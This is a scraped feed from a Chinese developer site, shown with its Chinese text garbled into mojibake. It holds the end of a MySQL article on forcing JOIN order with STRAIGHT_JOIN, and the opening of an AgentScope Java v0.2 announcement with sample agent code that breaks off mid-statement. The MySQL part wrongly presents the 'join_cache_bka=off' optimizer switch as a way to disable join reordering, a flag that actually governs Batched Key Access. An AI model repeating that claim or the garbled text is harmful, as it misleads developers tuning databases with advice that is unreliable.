<p>å¦‚æœæŸäº›ç‰¹æ®Šåœºæ™¯ä¸‹ï¼Œä½ ç¡®å®šè‡ªå·±å†™çš„ JOIN é¡ºåºæ¯” MySQL ä¼˜åŒ–å™¨é€‰çš„æ›´ä¼˜ï¼Œæƒ³è¦<strong>ç¦ç”¨ä¼˜åŒ–å™¨çš„å…³è”é¡ºåºè°ƒæ•´</strong>ï¼Œå¼ºåˆ¶æŒ‰ SQL ä¹¦å†™é¡ºåºæ‰§è¡Œ JOINï¼Œæœ‰ 2 ç§å¯é æ–¹æ³•ï¼š</p>
<h3 data-id="heading-19">âœ… æ–¹æ³•1ï¼šä½¿ç”¨ <code>STRAIGHT_JOIN</code> å…³é”®å­—ï¼ˆæ¨èï¼Œè½»é‡ï¼‰</h3>
<p><code>STRAIGHT_JOIN</code> æ˜¯ <code>JOIN</code> çš„ã€Œå¼ºåˆ¶é¡ºåºç‰ˆã€ï¼ŒåŠŸèƒ½å’Œ <code>JOIN</code> å®Œå…¨ä¸€è‡´ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯ï¼š<strong>å¼ºåˆ¶ MySQL æŒ‰ç…§ SQL ä¸­ä¹¦å†™çš„è¡¨é¡ºåºæ‰§è¡Œ JOINï¼Œä¸åšä»»ä½•è°ƒæ•´</strong>ã€‚</p>
<p>è¯­æ³•ï¼šæŠŠ SQL ä¸­çš„ <code>JOIN</code> æ›¿æ¢æˆ <code>STRAIGHT_JOIN</code> å³å¯ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å¼ºåˆ¶ï¼šå…ˆæŸ¥ order è¡¨ â†’ å†æŸ¥ user è¡¨ï¼Œå®Œå…¨æŒ‰ä¹¦å†™é¡ºåºæ‰§è¡Œ</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o STRAIGHT_JOIN `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id;
</code></pre>
<h3 data-id="heading-20">âœ… æ–¹æ³•2ï¼šå…³é—­ä¼˜åŒ–å™¨çš„å…³è”é¡ºåºä¼˜åŒ–ï¼ˆä¸æ¨èï¼Œå…¨å±€ç”Ÿæ•ˆï¼‰</h3>
<p>é€šè¿‡è®¾ç½® MySQL ä¼šè¯å‚æ•°å…³é—­ä¼˜åŒ–å™¨ï¼Œä¼šå½±å“æ‰€æœ‰æŸ¥è¯¢ï¼Œè°¨æ…ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å…³é—­å…³è”é¡ºåºä¼˜åŒ–</span>
<span class="hljs-keyword">SET</span> optimizer_switch<span class="hljs-operator">=</span><span class="hljs-string">'join_cache_bka=off'</span>;
<span class="hljs-comment">-- æ‰§è¡Œä½ çš„ JOIN æŸ¥è¯¢</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id;
<span class="hljs-comment">-- ç”¨å®Œå»ºè®®æ¢å¤é»˜è®¤</span>
<span class="hljs-keyword">SET</span> optimizer_switch<span class="hljs-operator">=</span><span class="hljs-string">'join_cache_bka=on'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-21">âœ¨ å…¨æ–‡æ ¸å¿ƒçŸ¥è¯†ç‚¹æ€»ç»“ï¼ˆå¿…è®°ï¼‰</h2>
<ol>
<li><code>EXPLAIN</code> <strong>å¯ä»¥ç²¾å‡†æŸ¥çœ‹</strong> MySQL JOIN çš„å…³è”é¡ºåºï¼Œæ˜¯æ ¸å¿ƒåˆ†æå·¥å…·ï¼›</li>
<li>JOIN å…³è”é¡ºåºæ ¸å¿ƒè§„åˆ™ï¼š<code>EXPLAIN</code> ç»“æœ <strong>ä»ä¸‹å¾€ä¸Šæ‰§è¡Œ</strong>ï¼Œåè¡Œæ˜¯é©±åŠ¨è¡¨ï¼ˆå…ˆæ‰§è¡Œï¼‰ï¼Œå‰è¡Œæ˜¯è¢«é©±åŠ¨è¡¨ï¼ˆåæ‰§è¡Œï¼‰ï¼›</li>
<li>åˆ¤æ–­ JOIN çš„ 2 ä¸ªæ ¸å¿ƒå­—æ®µï¼š<code>type</code> åˆ—ï¼ˆå¿…ä¸º <code>ref/eq_ref</code>ï¼‰+ <code>key</code> åˆ—ï¼ˆé NULL ä»£è¡¨ç”¨åˆ°å…³è”ç´¢å¼•ï¼‰ï¼›</li>
<li>å¤šè¡¨ JOIN è§„åˆ™ä¸å˜ï¼Œå€’åºçœ‹ <code>EXPLAIN</code> ç»“æœå°±æ˜¯æ‰§è¡Œé¡ºåºï¼›</li>
<li>MySQL ä¼š<strong>è‡ªåŠ¨è°ƒæ•´ JOIN é¡ºåº</strong>ï¼ˆå°è¡¨ä¼˜å…ˆåšé©±åŠ¨è¡¨ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒæ•´ä¹¦å†™é¡ºåºï¼›</li>
<li>å¼ºåˆ¶æŒ‰ä¹¦å†™é¡ºåºæ‰§è¡Œï¼šç”¨ <code>STRAIGHT_JOIN</code> æ›¿æ¢ <code>JOIN</code> å³å¯ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hello AgentScope Java]]></title>    <link>https://juejin.cn/post/7588570963294535723</link>    <guid>https://juejin.cn/post/7588570963294535723</guid>    <pubDate>2025-12-29T05:29:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588570963294535723" data-draft-id="7588445332773158966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hello AgentScope Java"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ,Agent"/> <meta itemprop="datePublished" content="2025-12-29T05:29:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hello AgentScope Java
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:29:22.000Z" title="Mon Dec 29 2025 05:29:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šè¿œäº‘</p>
<p>éšç€ LLM åº”ç”¨çš„é£é€Ÿå‘å±•ï¼Œè¶Šæ¥è¶Šå¤šçš„ Agent åº”ç”¨å¼€å§‹èµ°è¿‘æ¯ä¸ªäººã€‚å›´ç»•ç€ Agent åº”ç”¨çš„æ ¸å¿ƒï¼Œç›®å‰ä¸šç•Œæœ‰é›¶ä»£ç ã€ä½ä»£ç å’Œé«˜ä»£ç ä¸‰æ¡ä¸»æµçš„æŠ€æœ¯è·¯çº¿ã€‚AgentScope ä½œä¸º Python ç¤¾åŒºä¸­å—åˆ°å¹¿æ³›åº”ç”¨çš„é«˜ä»£ç æ¡†æ¶ï¼Œåœ¨ Java ç”Ÿæ€ä¸‹çš„éœ€æ±‚ä¹Ÿè¶Šæ¥è¶Šå¤§ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å¾ˆé«˜å…´åœ°å®£å¸ƒÂ <strong>AgentScope Java v0.2 ç‰ˆæœ¬</strong>æ­£å¼å‘å¸ƒäº†ï¼Œå…·å¤‡äº†æ‰€æœ‰æ ¸å¿ƒçš„ ReActAgent çš„èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-0">ç¬¬ä¸€æ€§åŸåˆ™ï¼šé€æ˜åº¦</h2>
<p>AgentScope çš„é¦–è¦è®¾è®¡ç›®æ ‡æ˜¯<strong>å¯¹å¼€å‘è€…é€æ˜</strong>ã€‚</p>
<p>å½“ä¸‹ï¼Œè®¸å¤š Agent æ¡†æ¶å°†åº•å±‚çš„è°ƒåº¦è¿›è¡Œäº†æ·±åº¦çš„å°è£…ï¼Œè¿™å›ºç„¶ä¼šç»™ç”¨æˆ·å¸¦æ¥ä¸€äº›æ¦‚å¿µä¸Šçš„ç®€åŒ–ï¼Œä½†æ˜¯ä¹Ÿå¸¦æ¥äº†é‡åˆ°é—®é¢˜æ—¶æ’æŸ¥çš„å¤æ‚åº¦ã€‚AgentScope ä¸åŒï¼š</p>
<ul>
<li><strong>Prompt Engineeringï¼š</strong> ç”¨æˆ·å¯ä»¥è‡ªå·±ä¿®æ”¹æ‰€æœ‰æç¤ºè¯ç›¸å…³çš„å†…å®¹ã€‚</li>
<li><strong>API è°ƒç”¨ï¼š</strong> æ¯ä¸€æ¬¡ API è°ƒç”¨éƒ½èƒ½å¤Ÿè¢«å®šä½ã€‚</li>
<li><strong>Agent æ„å»ºï¼š</strong> æ‰€æœ‰ Agent çš„é…ç½®éƒ½æ¥è‡ªç”¨æˆ·ç¡®å®šæ€§çš„é…ç½®ã€‚</li>
<li><strong>å†³ç­–è¿‡ç¨‹ï¼š</strong> Agent çš„æ¨ç†ã€æ‰§è¡Œè¿‡ç¨‹éƒ½å¯ä»¥é€šè¿‡ Hook å¯¹å¤–æš´éœ²ã€‚</li>
</ul>
<h2 data-id="heading-1">ä¸‰åˆ†é’Ÿæ„å»ºä¸€ä¸ªæ™ºèƒ½ä½“</h2>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ™ºèƒ½ä½“ç¤ºä¾‹ï¼š</p>
<h3 data-id="heading-2">Maven ä¾èµ–</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
Â  Â Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.agentscope<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
Â  Â Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>agentscope-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
Â  Â Â <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">ReActAgent</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">public</span>Â <span class="hljs-selector-tag">class</span>Â <span class="hljs-selector-tag">HelloAgentScope</span>Â {
Â  Â Â <span class="hljs-selector-tag">public</span>Â <span class="hljs-selector-tag">static</span>Â <span class="hljs-selector-tag">void</span>Â <span class="hljs-selector-tag">main</span>(String[]Â args)Â {
Â  Â  Â  Â Â <span class="hljs-comment">// åˆ›å»º ReActAgent</span>
Â  Â  Â  Â  <span class="hljs-selector-tag">ReActAgent</span> <span class="hljs-selector-tag">agent</span> = <span class="hljs-selector-tag">ReActAgent</span><span class="hljs-selector-class">.builder</span>()
Â  Â  Â  Â  Â  Â  <span class="hljs-selector-class">.name</span>(<span class="hljs-string">"Assistant"</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-selector-class">.model</span>(DashScopeChatModel.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">apiKey</span>(System.<span class="hljs-built_in">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>))
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">modelName</span>(<span class="hljs-string">"qwen3-max"</span>)
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  Â  Â  Â  Â  <span class="hljs-selector-class">.build</span>();
Â  Â  Â  Â Â <span class="hljs-comment">// è°ƒç”¨æ™ºèƒ½ä½“</span>
Â  Â  Â  Â  <span class="hljs-selector-tag">Msg</span> <span class="hljs-selector-tag">response</span> = <span class="hljs-selector-tag">agent</span><span class="hljs-selector-class">.call</span>(
Â  Â  Â  Â  Â  Â  Msg.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">role</span>(MsgRole.USER)
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">content</span>(TextBlock.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">text</span>(<span class="hljs-string">"ä½ å¥½ï¼Œè¯·ä»‹ç»ä¸€ä¸‹è‡ªå·±"</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>()
Â  Â  Â  Â  )<span class="hljs-selector-class">.block</span>();
Â  Â  Â  Â  <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(response.<span class="hljs-built_in">getTextContent</span>());
Â  Â  }
}
</code></pre>
<p>è‡³æ­¤ï¼Œä¸€ä¸ª Agent å°±æ„å»ºå®Œæˆäº†ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>ReActAgent</code>Â æ˜¯ AgentScope çš„æ ¸å¿ƒï¼Œæˆ‘ä»¬åé¢å‡ ä¹æ‰€æœ‰çš„åŠŸèƒ½éƒ½æ˜¯åŸºäºå®ƒçš„ã€‚</p>
<h2 data-id="heading-4">æ¶æ„æ¦‚è§ˆ</h2>
<p>å’Œ Python ç‰ˆæœ¬ç±»ä¼¼ï¼ŒAgentScope Java é‡‡ç”¨åˆ†å±‚æ¶æ„ï¼š</p>
<h3 data-id="heading-5">åŸºç¡€ç»„ä»¶å±‚ï¼ˆFoundational Componentsï¼‰</h3>
<p><strong>Message</strong>ï¼šç»Ÿä¸€çš„æ¶ˆæ¯æŠ½è±¡å¯¹è±¡ï¼Œé€šè¿‡ä¸€å¥—æ•°æ®ç»“æ„æ”¯æŒæ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ã€‚</p>
<p><strong>Model API</strong>ï¼šæ”¯æŒ DashScopeã€OpenAI ç­‰ä¸»æµæ¨¡å‹æä¾›å•†ã€‚é€šè¿‡ Formatter æœºåˆ¶å±è”½ä¸åŒæ¨¡å‹æä¾›å•†çš„æ ¼å¼å·®å¼‚ã€‚</p>
<p><strong>Tool</strong>ï¼šå…è®¸ç”¨æˆ·å®šä¹‰å·¥å…·ç»™ LLM ä½¿ç”¨ï¼Œæ”¯æŒåŒæ­¥/å¼‚æ­¥ã€æµå¼/éæµå¼ç­‰ API é£æ ¼ã€‚</p>
<h3 data-id="heading-6">æ™ºèƒ½ä½“åŸºç¡€è®¾æ–½å±‚ï¼ˆAgent-level Infrastructureï¼‰</h3>
<p><strong>ReAct èŒƒå¼</strong>ï¼šæ ¸å¿ƒ Agentic å®ç°ï¼Œé€šè¿‡æ¨ç†ï¼ˆReasoningï¼‰å†è¡ŒåŠ¨ï¼ˆActingï¼‰çš„è¿­ä»£å¾ªç¯ã€‚</p>
<p><strong>Agent Hooks</strong>ï¼šè¿è¡Œäº ReActAgent å†…éƒ¨ï¼Œå…è®¸ç”¨æˆ·å¯¹ Agent æ‰§è¡Œçš„è¿‡ç¨‹è¿›è¡Œç›‘æµ‹ã€ä¿®æ”¹ã€‚</p>
<p><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šä¼šè¯æŒä¹…åŒ–ç»„ä»¶ï¼Œæ”¯æŒç”¨æˆ·å¯¹è¯çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤ã€‚</p>
<h3 data-id="heading-7">å¤šæ™ºèƒ½ä½“åä½œå±‚ï¼ˆMulti-Agent Cooperationï¼‰</h3>
<p><strong>MsgHub</strong>ï¼šæ”¯æŒå¤šä¸ª Agent ä¹‹é—´å…±äº«æ¶ˆæ¯ï¼Œå®ç°å¤š Agent æ²Ÿé€šåä½œçš„å·¥å…·ã€‚</p>
<p><strong>Pipeline</strong>ï¼šç»„åˆå¤šä¸ª Agent æŒ‰ç…§ç‰¹å®šï¼ˆé¡ºåºã€å¹¶è¡Œç­‰ï¼‰ç­–ç•¥æ‰§è¡Œçš„å·¥å…·ã€‚</p>
<h3 data-id="heading-8">éƒ¨ç½²å±‚ï¼ˆDeploymentï¼‰</h3>
<p><strong>AgentScope Runtime</strong>ï¼šè§£å†³åˆ†å¸ƒå¼éƒ¨ç½²ä¸å®‰å…¨éš”ç¦»é—®é¢˜çš„ä¼ä¸šçº§è¿è¡Œæ—¶åŸºç¡€è®¾æ–½ï¼Œæä¾›å·¥å…·è¿è¡Œæ²™ç®±ã€A2A åè®®ã€è¿œç¨‹éƒ¨ç½²ç­‰èƒ½åŠ›ã€‚</p>
<p><strong>AgentScope Studio</strong>ï¼šæä¾›å¼€å‘é˜¶æ®µåˆ°è¿è¡Œé˜¶æ®µçš„å¯è§†åŒ–è°ƒè¯•ã€è§‚æµ‹èƒ½åŠ›ï¼Œä¸ºå¼€å‘è€…ä» 0 åˆ° 1 çš„å¼€å‘æé€Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf8363e331ea4525984b08cbabfea77e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590961&amp;x-signature=N%2BTJvd%2BCs9XkR25K8NqZX4l2TFI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-9">Reasoning and Acting</h2>
<p>ReActï¼ˆReasoning and Actingï¼‰æ˜¯ AgentScope æœ€æ ¸å¿ƒçš„å®ç°èŒƒå¼ã€‚å…¶è®¾è®¡æ€è·¯å¾ˆç®€å•ï¼šå°†æ€è€ƒå’Œæ‰§è¡Œåˆ†ç¦»ï¼Œé€šè¿‡è¿­ä»£å¾ªç¯è§£å†³é—®é¢˜ã€‚</p>
<h3 data-id="heading-10">å·¥ä½œåŸç†</h3>
<p><strong>Reasoningï¼ˆæ¨ç†ï¼‰é˜¶æ®µ</strong>ï¼šAgent ä¼šåŸºäºå½“å‰çš„ä¸Šä¸‹æ–‡åˆ†æï¼Œå†³å®šä¸‹ä¸€æ­¥è¡ŒåŠ¨ï¼š</p>
<ul>
<li>ç†è§£ç”¨æˆ·æ„å›¾</li>
<li>è¯„ä¼°å·²æœ‰ä¿¡æ¯ï¼ˆä¸Šä¸‹æ–‡ï¼‰</li>
<li>ç¡®å®šéœ€è¦è°ƒç”¨çš„å·¥å…·åŠå‚æ•°</li>
</ul>
<p><strong>Actingï¼ˆè¡ŒåŠ¨ï¼‰é˜¶æ®µ</strong>ï¼šæ‰§è¡Œ Reasoning é˜¶æ®µæ‰€éœ€çš„è·å–æ•°æ®è¡Œä¸ºã€‚</p>
<ul>
<li>å¹¶è¡Œæ‰§è¡Œå·¥å…·è°ƒç”¨</li>
<li>æ”¶é›†æ‰§è¡Œç»“æœ</li>
<li>å°†ç»“æœè®¡å…¥è®°å¿†</li>
</ul>
<p><strong>è¿­ä»£æ§åˆ¶</strong>ï¼šReActAgent ä¼šä¸æ–­æ‰§è¡Œ Reasoning å’Œ Acting çš„è¿­ä»£ï¼Œå¦‚æœæ¨¡å‹åœ¨æœ€å¤§è¿­ä»£è½®å†…å®Œæˆè¿­ä»£åˆ™ä¼šæ­£å¸¸ç»“æŸï¼Œå¦‚æœæœªå®Œæˆåˆ™ä¼šè§¦å‘ summary çš„èƒ½åŠ›ï¼Œè¿›è¡Œä¼šè¯æ€»ç»“ã€‚</p>
<h3 data-id="heading-11">ä¸º ReActAgent æ·»åŠ å·¥å…·</h3>
<p>ä¸ºäº†è®© ReActAgent çœŸæ­£å¯ä»¥å®ç° Actingï¼Œéœ€è¦ä¸º ReActAgent æ·»åŠ å¯¹åº”çš„å·¥å…·ã€‚</p>
<p>è¿™é‡Œä»¥ä¸€ä¸ª Weather Assistant ä¸ºä¾‹å­ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// å®šä¹‰å·¥å…·ç±»</span>
<span class="hljs-selector-tag">public</span>Â <span class="hljs-selector-tag">class</span>Â <span class="hljs-selector-tag">WeatherTools</span>Â {
Â  Â Â <span class="hljs-variable">@Tool</span>(description =Â <span class="hljs-string">"è·å–æŒ‡å®šåŸå¸‚çš„å¤©æ°”ä¿¡æ¯"</span>)
Â  Â Â publicÂ StringÂ <span class="hljs-built_in">getWeather</span>(
Â  Â  Â  Â Â <span class="hljs-variable">@ToolParam</span>(name =Â <span class="hljs-string">"city"</span>, description =Â <span class="hljs-string">"åŸå¸‚åç§°"</span>)Â StringÂ city) {
Â  Â  Â  Â Â <span class="hljs-comment">// å®é™…åº”ç”¨ä¸­è°ƒç”¨å¤©æ°” API</span>
Â  Â  Â  Â Â <span class="hljs-selector-tag">return</span>Â <span class="hljs-selector-tag">String</span><span class="hljs-selector-class">.format</span>(<span class="hljs-string">"%sï¼šæ™´å¤©ï¼Œæ°”æ¸© 25 â„ƒ"</span>, city);
Â  Â  }
}
<span class="hljs-comment">// æ³¨å†Œå·¥å…·</span>
<span class="hljs-selector-tag">Toolkit</span>Â <span class="hljs-selector-tag">toolkit</span> =Â <span class="hljs-selector-tag">new</span>Â <span class="hljs-selector-tag">Toolkit</span>();
<span class="hljs-selector-tag">toolkit</span><span class="hljs-selector-class">.registerTool</span>(newÂ <span class="hljs-built_in">WeatherTools</span>());
<span class="hljs-comment">// æ„å»ºå¸¦å·¥å…·çš„ ReActAgent</span>
<span class="hljs-selector-tag">ReActAgent</span>Â <span class="hljs-selector-tag">agent</span> =Â <span class="hljs-selector-tag">ReActAgent</span><span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>(<span class="hljs-string">"WeatherAssistant"</span>)
Â  Â  <span class="hljs-selector-class">.sysPrompt</span>(<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªå¤©æ°”åŠ©æ‰‹ï¼Œå¯ä»¥æŸ¥è¯¢åŸå¸‚å¤©æ°”ä¿¡æ¯ã€‚"</span>)
Â  Â  <span class="hljs-selector-class">.model</span>(DashScopeChatModel.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  .<span class="hljs-built_in">apiKey</span>(System.<span class="hljs-built_in">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>))
Â  Â  Â  Â  .<span class="hljs-built_in">modelName</span>(<span class="hljs-string">"qwen3-max"</span>)
Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  <span class="hljs-selector-class">.toolkit</span>(toolkit)
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// è°ƒç”¨æ™ºèƒ½ä½“</span>
<span class="hljs-selector-tag">Msg</span>Â <span class="hljs-selector-tag">response</span> = <span class="hljs-selector-tag">agent</span><span class="hljs-selector-class">.call</span>(
Â  Â Â Msg.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">role</span>(MsgRole.USER)
